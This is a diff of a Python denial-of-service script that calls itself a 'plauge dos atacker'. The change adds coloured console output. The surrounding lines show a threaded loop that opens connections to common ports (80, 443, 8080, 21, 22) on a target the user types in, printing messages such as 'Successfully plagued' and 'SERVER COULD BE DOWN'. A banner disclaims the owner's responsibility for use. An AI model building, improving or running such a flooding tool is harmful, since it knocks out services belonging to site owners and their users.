@@ -4,6 +4,17 @@ import os
 import threading
 import random
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 ports = [80, 443, 8080, 21, 22]  # Common ports to target
 
 def attack(target, port, duration):
@@ -23,22 +34,22 @@ def attack(target, port, duration):
             s.recv(1024)
             end = time.time()
             ping = round((end - start) * 1000, 2)
-            print(f"Successfully plagued {target}:{port}! 🤢🦠 attempting to destroy | Ping: {ping}ms")
+            print(bcolors.OKGREEN + f"Successfully plagued {target}:{port}! 🤢🦠 attempting to destroy | Ping: {ping}ms")
         except Exception as e:
-            print(f"Error: {e}")
+            print(bcolors.FAIL + f"SERVER COULD BE DOWN: {e}")
         finally:
             s.close()
     print(f"Attack ended on {target}:{port}.")
 
 def main():
     os.system('clear' if os.name == 'posix' else 'cls')
-    print ("┏┓┓ ┏┓┳┳┏┓┏┓")
-    print ("┃┃┃ ┣┫┃┃┃┓┣ ")
-    print ("┣┛┗┛┛┗┗┛┗┛┗┛")
-    print("WELCOME TO plauge dos atacker") 
-    print("powered by enom")
-    print("used to infect sites")
-    print("anything you do is not the owners fault")
+    print (bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
+    print (bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣ ")
+    print (bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛")
+    print(bcolors.OKGREEN + "WELCOME TO plauge dos atacker") 
+    print(bcolors.OKCYAN + "powered by enom")
+    print(bcolors.OKCYAN + "used to infect sites")
+    print(bcolors.WARNING + "anything you do is not the owners fault")
     target = input("Enter the target IP or website: ")
     duration = int(input("Enter the duration in minutes: "))
     thread_count = int(input("Enter the number of threads to use: "))
